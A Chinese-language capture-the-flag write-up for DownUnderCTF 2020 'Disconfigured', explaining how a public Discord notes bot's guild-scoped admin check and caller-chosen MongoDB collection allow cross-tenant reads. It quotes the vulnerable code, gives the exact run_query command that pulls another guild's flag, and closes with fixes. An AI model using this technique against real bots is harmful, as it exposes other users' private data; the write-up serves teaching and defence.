# DownUnderCTF 2020 - Disconfigured

## 题目简述

题目是一只用于保存 notes 的 Discord bot。bot 被错误设置为 public，任何人都能邀请它进入自己的服务器；管理命令只检查调用者是否是“当前服务器”的管理员，却允许调用者自由指定 MongoDB collection。每个服务器的数据以 guild ID 作为 collection 名，这就把本地管理员权限错误地扩展成了跨租户数据库查询权限。

## 解题过程

### 在自建服务器取得管理命令

开启 Discord Developer Mode 后可以复制 bot 的 client ID，并用标准 OAuth2 bot invite 流把它邀请到自己创建的服务器。自己在该服务器中拥有 administrator 权限，所以 `!help` 会额外显示：

```text
get_server_notes  Returns all of the notes affiliated with this server
run_query         Run a query in the given collection
```

权限装饰器只检查当前消息上下文：

```python
def is_admin():
    def predicate(ctx):
        if ctx.channel.type == ChannelType.private:
            return False
        return ctx.message.author.guild_permissions.administrator
    return commands.check(predicate)
```

这能证明我们是自建服务器的管理员，但不能证明我们有权访问别的 guild 数据。

### 利用跨租户 collection 选择

管理命令把两个用户参数原样传给数据库层：

```python
@commands.command()
@is_admin()
async def run_query(self, ctx, query: str, collection: str):
    res = db.run_query(query, collection)
```

而数据库层只检查 collection 是否存在，随后执行调用者给出的 Mongo 查询：

```python
def run_query(query: str, collection: str):
    if collection not in db.list_collection_names():
        return
    target = json.loads(query)
    return [doc for doc in db.get_collection(collection).find(target)]
```

因此 collection 没有绑定 `ctx.guild.id`。复制 DUCTF 官方服务器的 guild ID 后，在自建服务器中提交只匹配含 flag note 的查询：

```text
!run_query {"notes":{"$elemMatch":{"$regex":"DUCTF"}}} <DUCTF_GUILD_ID>
```

双引号要转义，否则 discord.py 的多词参数解析会先拆坏 JSON。也可以先用 `{}` 对自己的 collection 做低风险基线测试，确认返回结构，再切换到目标 guild collection。

命中记录中得到：

```text
DUCTF{you_can_be_an_admin_if_you_believe}
```

## 方法总结

- 核心技巧：利用 public bot 的可邀请性获得本地管理员上下文，再通过未绑定租户的 collection 参数实施跨租户数据访问。
- 识别信号：鉴权只判断角色、不同时校验目标资源归属；数据库名、guild ID、tenant ID 等资源选择器由客户端提供，都是 BOLA/IDOR 的典型信号。
- 复用要点：服务端必须从可信会话上下文推导 collection，例如固定使用 `str(ctx.guild.id)`；“调用者是某处管理员”不等于“调用者能读取任意租户”。Mongo 查询还应使用受限字段和操作符白名单。
